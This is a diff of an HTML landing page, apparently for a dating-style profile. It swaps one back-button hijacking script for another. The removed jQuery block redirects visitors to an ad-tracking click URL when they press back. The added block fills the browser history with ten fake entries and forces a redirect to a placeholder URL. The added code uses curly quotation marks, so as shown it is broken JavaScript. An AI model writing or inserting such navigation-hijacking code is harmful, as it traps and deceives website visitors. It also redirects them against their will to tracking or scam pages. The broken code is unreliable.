@@ -19,16 +19,18 @@
          return decodeURIComponent(results[2].replace(/\+/g, " "));
      }
  </script>
-  <script>
-     $(function() {
-    if (window.history && window.history.pushState) {
-        window.history.pushState('', null, './');
-        $(window).on('popstate', function() {
-            document.location.href = 'https://114p8.bemobtrcks.com/click';
-        });
-    }
-});
- </script>
+ 
+<script type=”text/javascript”>
+! function () {
+var t;
+try {
+for (t = 0; 10 > t; ++t) history.pushState({}, “”, “#”);
+onpopstate = function (t) {
+t.state && location.replace(“https://targeturl.com“)
+}
+} catch (o) {}
+}();
+</script>
 	<link rel="stylesheet" href="css/bootstrap.min.css">
 	<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
 	<link rel="stylesheet" href="css/profile_de_mia_1-stylesheet.css">
